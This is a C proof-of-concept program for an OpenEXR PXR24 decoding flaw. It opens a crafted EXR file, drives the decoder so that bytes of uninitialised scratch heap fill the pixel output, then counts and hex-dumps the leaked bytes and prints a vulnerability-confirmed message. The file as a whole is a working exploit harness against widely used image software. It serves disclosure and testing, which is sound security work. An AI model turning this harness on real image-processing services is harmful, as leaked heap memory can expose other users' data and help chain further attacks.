/*
 * CVE PoC: OpenEXR PXR24 Heap-Uninitialized-Read
 *
 * Reads a crafted PXR24-compressed EXR whose chunk-0 zlib stream
 * decompresses to 256 B while the decoder expects 4096 B.
 * The 3840-byte gap is filled from uninitialised scratch-heap.
 *
 * Trigger path:
 *   exr_decoding_run → undo_pxr24_impl → exr_uncompress_buffer (outSize ignored)
 *
 * With MSAN this is detected as use-of-uninitialised-value.
 * Without sanitisers the leaked heap bytes appear in the pixel output.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openexr.h>

int main(int argc, char **argv)
{
    const char *file = argc > 1 ? argv[1] : "/poc/pxr24_heap_oob.exr";

    exr_context_t             ctx   = NULL;
    exr_context_initializer_t cinit = EXR_DEFAULT_CONTEXT_INITIALIZER;
    exr_chunk_info_t          ci;
    exr_decode_pipeline_t     dec   = EXR_DECODE_PIPELINE_INITIALIZER;
    exr_result_t              rv;

    /* open */
    rv = exr_start_read(&ctx, file, &cinit);
    if (rv) { fprintf(stderr, "open: %s\n", exr_get_default_error_message(rv)); return 1; }

    /* chunk 0 */
    rv = exr_read_scanline_chunk_info(ctx, 0, 0, &ci);
    if (rv) { fprintf(stderr, "chunk: %s\n", exr_get_default_error_message(rv)); return 1; }

    rv = exr_decoding_initialize(ctx, 0, &ci, &dec);
    if (rv) { fprintf(stderr, "init: %s\n", exr_get_default_error_message(rv)); return 1; }

    rv = exr_decoding_choose_default_routines(ctx, 0, &dec);
    if (rv) { fprintf(stderr, "route: %s\n", exr_get_default_error_message(rv)); return 1; }

    size_t   sz  = (size_t)ci.width * ci.height * 4;
    uint8_t *px  = (uint8_t *)calloc(1, sz);

    for (int c = 0; c < dec.channel_count; c++) {
        dec.channels[c].decode_to_ptr      = px;
        dec.channels[c].user_pixel_stride  = 4;
        dec.channels[c].user_line_stride   = ci.width * 4;
    }

    /* decode — this triggers the uninitialised-heap read in undo_pxr24_impl */
    rv = exr_decoding_run(ctx, 0, &dec);

    /*
     * Chunk 0: zlib decompresses to 256 B (1 line × 64 px × 4 B).
     * Decoder consumes 4096 B from scratch buffer (16 lines × 64 px × 4 B).
     * Bytes [256 .. 4095] were never written → heap garbage.
     *
     * After PXR24 byte-plane reassembly the garbage ends up in the output
     * pixels starting at byte 256 of the output (= pixel row 1+).
     */
    int leaked = 0;
    for (size_t i = 256; i < sz; i++)
        if (px[i]) leaked++;

    printf("decode   : %s\n", rv ? exr_get_default_error_message(rv) : "OK");
    printf("expected : 4096 B  |  actual decompressed : 256 B\n");
    printf("leaked   : %d / %zu bytes non-zero in uninitialised region\n", leaked, sz - 256);

    if (leaked) {
        printf("\nhex @ offset 256 (heap leak):\n");
        for (int i = 256; i < 288 && i < (int)sz; i++)
            printf("%02x ", px[i]);
        printf("\n\nVULNERABILITY CONFIRMED — uninitialised heap data in pixel output\n");
    }

    free(px);
    exr_decoding_destroy(ctx, &dec);
    exr_finish(&ctx);
    return leaked ? 2 : 0;
}
